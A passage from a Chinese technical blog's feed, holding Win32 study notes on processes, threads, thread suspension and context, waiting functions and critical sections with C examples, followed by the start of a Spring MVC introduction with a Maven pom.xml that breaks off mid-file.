title="模块目录和工作目录"></a>模块目录和工作目录</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> strModule[<span class="number">256</span>];</span><br><span class="line">    GetModuleFileName(<span class="literal">NULL</span>,(LPWSTR)strModule, <span class="number">256</span>);<span class="comment">// 得到当前模块目录，当前exe所在的路径，包含exe文件名</span></span><br><span class="line">    <span class="keyword">char</span> strWork[<span class="number">1000</span>];</span><br><span class="line">    GetCurrentDirectory(<span class="number">1000</span>, (LPWSTR)strWork); <span class="comment">// 获取当前工作目录</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;模块目录：%ws \n工作目录：%ws \n&quot;</span>, strModule, strWork);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他进程相关API"><a href="#其他进程相关API" class="headerlink" title="其他进程相关API"></a>其他进程相关API</h2><p>获取当前进程ID（PID）：GetCurrentProcessId</p><p>获取当前进程句柄：GetCurrentProcess</p><p>获取命令行：GetCommandLine</p><p>获取启动信息：GetStartupInfo</p><p>遍历进程ID：EnumProcesses</p><p>快照：CreateToolhelp32Snapshot</p><h1 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h1><p>线程：附属在进程上的执行实体，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">( <span class="comment">// 返回值是线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T dwStackSize,                       <span class="comment">// initial stack size 初始堆栈</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPTHREAD_START_ROUTINE lpStartAddress,    <span class="comment">// thread function 线程执行的函数代码</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpParameter,                       <span class="comment">// thread argument 线程需要的参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwCreationFlags,                    <span class="comment">// creation option 标识，也可以以挂起形式创建线程</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpThreadId                        <span class="comment">// thread identifier 返回当前线程ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 线程执行的函数有语法要求，参考MSDN Library</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        Sleep(<span class="number">500</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;++++++ %d \n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hd;</span><br><span class="line">    <span class="comment">// 创建线程</span></span><br><span class="line">    hd=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    CloseHandle(hd);</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        Sleep(<span class="number">500</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;------ %d \n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">int</span>* p = (<span class="keyword">int</span>*)lpParameter;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; *p; i++) &#123;</span><br><span class="line">....................</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">.............</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">10</span>;</span><br><span class="line">    <span class="comment">// 创建线程</span></span><br><span class="line">    hd=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, &amp;n, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    CloseHandle(hd);</span><br><span class="line">..........</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="线程控制"><a href="#线程控制" class="headerlink" title="线程控制"></a>线程控制</h1><h2 id="停止线程"><a href="#停止线程" class="headerlink" title="停止线程"></a>停止线程</h2><p>停止自己的线程，可以使用sleep函数，上面有。</p><p>下面是停止别的线程：</p><h2 id="SuspendThread"><a href="#SuspendThread" class="headerlink" title="SuspendThread"></a>SuspendThread</h2><p>SuspendThread函数用于暂停（挂起）某个线程，当暂停后该线程不会占用CPU，只需要传入一个线程句柄：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">SuspendThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread   <span class="comment">// handle to thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hd;</span><br><span class="line">hd = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">Sleep(<span class="number">3000</span>);</span><br><span class="line">SuspendThread(hd);</span><br><span class="line">Sleep(<span class="number">3000</span>);</span><br><span class="line">ResumeThread(hd);</span><br><span class="line">CloseHandle(hd);</span><br></pre></td></tr></table></figure><h2 id="等待线程结束"><a href="#等待线程结束" class="headerlink" title="等待线程结束"></a>等待线程结束</h2><h3 id="WaitForSingleObject"><a href="#WaitForSingleObject" class="headerlink" title="WaitForSingleObject"></a>WaitForSingleObject</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForSingleObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hHandle,       </span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMilliseconds   <span class="comment">// time-out interval 等待超时时间（毫秒）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>INFINITE</code>表示，不指定超时时间，要执行完才继续走</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hd;</span><br><span class="line">hd=CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   </span><br><span class="line">WaitForSingleObject(hd, INFINITE);</span><br><span class="line">SuspendThread(hd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="WaitForMultipleObjects"><a href="#WaitForMultipleObjects" class="headerlink" title="WaitForMultipleObjects"></a>WaitForMultipleObjects</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">WaitForMultipleObjects</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD nCount,             <span class="comment">// number of handles in array 内核对象的数量</span></span></span></span><br><span class="line"><span class="params"><span class="function">  CONST HANDLE *lpHandles,  <span class="comment">// object-handle array 内核对象的句柄数组</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bWaitAll,            <span class="comment">// wait option 等待模式</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwMilliseconds      <span class="comment">// time-out interval 等待超时时间（毫秒）</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hd[<span class="number">2</span>];</span><br><span class="line">hd[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">hd[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">WaitForMultipleObjects(<span class="number">2</span>, hd,<span class="literal">true</span>, INFINITE);</span><br><span class="line">SuspendThread(hd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="GetExitCodeThread"><a href="#GetExitCodeThread" class="headerlink" title="GetExitCodeThread"></a>GetExitCodeThread</h3><p>和名字一样，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetExitCodeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread,      <span class="comment">// handle to the thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPDWORD lpExitCode   <span class="comment">// termination status</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="获取设置线程上下文"><a href="#获取设置线程上下文" class="headerlink" title="获取设置线程上下文"></a>获取设置线程上下文</h2><h2 id="GetThreadContext"><a href="#GetThreadContext" class="headerlink" title="GetThreadContext"></a>GetThreadContext</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetThreadContext</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread,       <span class="comment">// handle to thread with context 句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCONTEXT lpContext   <span class="comment">// context structure</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> HANDLE hd[<span class="number">2</span>];</span><br><span class="line"> hd[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* hd[1] = CreateThread(NULL, NULL, ThreadProc1, NULL, 0, NULL);*/</span></span><br><span class="line"></span><br><span class="line"> SuspendThread(hd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"> CONTEXT context;</span><br><span class="line"> context.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line"> GetThreadContext(hd[<span class="number">0</span>], &amp;context);</span><br><span class="line"></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;end\n%d ,%d&quot;</span>,context.Rax,context.Rbx);</span><br><span class="line"> ResumeThread(hd[<span class="number">0</span>]);</span><br><span class="line"> CloseHandle(hd[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><h3 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h3><p>修改线程上下文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetThreadContext</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hThread,            <span class="comment">// handle to thread</span></span></span></span><br><span class="line"><span class="params"><span class="function">  CONST CONTEXT *lpContext   <span class="comment">// context structure</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CONTEXT context;</span><br><span class="line">context.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line">context.Eax = <span class="number">0x123</span>;</span><br><span class="line">SetThreadContext(hd[<span class="number">0</span>], &amp;context);</span><br><span class="line"></span><br><span class="line">CONTEXT c;</span><br><span class="line">c.ContextFlags = CONTEXT_INTEGER;</span><br><span class="line">GetThreadContext(hd[<span class="number">0</span>], &amp;c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x ,%x&quot;</span>, c.Eax, c.Ebp);</span><br><span class="line">getchar();</span><br><span class="line">ResumeThread(hd[<span class="number">0</span>]);</span><br><span class="line">CloseHandle(hd[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><h1 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h1><p>每个线程都有自己的栈，局部变量是存储在栈中的，这就意味着每个进程都会有一份自己的“句柄变量”（栈），如果线程仅仅使用自己的“局部变量”那就不存在线程安全问题，反之，如果多个线程共用一个全局变量，且修改该全局变量就会出现问题。</p><p>临界资源：一次只有一个线程使用</p><p>临界区：访问临界资源的代码</p><h2 id="线程锁"><a href="#线程锁" class="headerlink" title="线程锁"></a>线程锁</h2><p>使用线程锁来解决上面的问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建全局变量：CRITICAL_SECTION cs;</span><br><span class="line">初始化全局变量：InitializeCriticalSection(&amp;cs);</span><br><span class="line">实现临界区：进入 → EnterCriticalSection(&amp;cs); 离开 → LeaveCriticalSection(&amp;cs);</span><br></pre></td></tr></table></figure><p>注意要init，找了半天错，，，，，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line"><span class="keyword">int</span> tickNUM = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        EnterCriticalSection(&amp;cs);</span><br><span class="line">        <span class="keyword">if</span> (tickNUM &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;现在有%d张 &quot;</span>, tickNUM);</span><br><span class="line">            tickNUM--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;还有%d 张\n&quot;</span>, tickNUM);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            LeaveCriticalSection(&amp;cs);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LeaveCriticalSection(&amp;cs);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    InitializeCriticalSection(&amp;cs);</span><br><span class="line">    HANDLE hd,hd1;</span><br><span class="line">    hd = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hd1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之后想看看免杀和内核相关的东西，先把win32再看一遍吧，好多都忘了，还是滴水的课程，感谢海哥的课程！&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="Win32" scheme="http://example.com/tags/Win32/"/>
    
  </entry>
  
  <entry>
    <title>Spring MVC初探</title>
    <link href="http://example.com/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/</id>
    <published>2022-03-30T16:00:00.000Z</published>
    <updated>2022-04-01T08:14:53.051Z</updated>
    
    <content type="html"><![CDATA[<p>最近想看看java，不知道从哪开始，。。正好spring有最近不太平，就从spring MVC开始看吧。</p><p>[toc]</p><h1 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h1><p>“静态”与”动态”，这两个词最大的不同就是在于其<strong>交互性</strong>。动态页面却可以实现根据用户的要求和选择而动态的去改变和响应，浏览器客户端，成为了前后端动态交互的一个桥梁。</p><h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><p>BS架构中，常见的为三层架构的开发模式：</p><ol><li><p>表现层（WEB层）</p><ul><li><p>  作用：接收客户端请求（一般是HTTP请求），同时向其响应结果</p></li><li><p>  分类：表现层分为，展示层和控制层，控制层 (Servlet) 负责接收请求，展示层 (HTML JSP) 负责结果的展示</p></li><li><p>在表现层会依赖于业务层，进行业务处理，也就是好比在 Servlet 中调用某个Service</p><p>  一般使用 MVC 模型开发（仅限此层，详情下面会说）</p></li></ul></li><li><p>业务层（Service层）</p><ul><li>  作用：根据项目需求，进行业务逻辑处理</li><li>  在业务层可能会依赖于持久层，也就是好比在 Service 中调用某个 Dao</li></ul></li><li><p>持久层（Dao）</p><ul><li>  作用：数据持久化</li><li>  说白了，就是实现和数据库之间的交互，本质都是增删改查，只不过不同的项目复杂程度会有所不同</li></ul></li></ol><h2 id="MVC模型"><a href="#MVC模型" class="headerlink" title="MVC模型"></a>MVC模型</h2><p>model-view-controller</p><ul><li>Model(模型)<ul><li>   可以叫做数据模型层，也就是用来封装数据的，例如请求的过程中，用户信息被封装在 User 实体类中，这个实体类就属于 Model 层中</li></ul></li><li>View(视图)<ul><li>  选择一个恰当的视图来显示最终的执行结果，例如常见的 HTML JSP 就是用来展示数据的</li></ul></li><li>Controller(控制)<ul><li>  比较直观的用来处理交互的部分，接收用户请求，然后执行业务等流程，以及一些数据的校验，最终反馈结果</li></ul></li></ul><p>如图：</p><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331215345787.png" alt="image-20220331215345787"></p><p>这一款框架，本质上也是基于 Servlet 的。</p><h1 id="浅尝"><a href="#浅尝" class="headerlink" title="浅尝"></a>浅尝</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>选择webapp：</p><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331215654564.png" alt="image-20220331215654564"></p><p>创建java和resource文件夹.</p><p>pom文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.ideal<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring_mvc_01_basic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>spring_mvc_01_basic Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- FIXME change it to the project&#x27;s website --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.example.com<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span 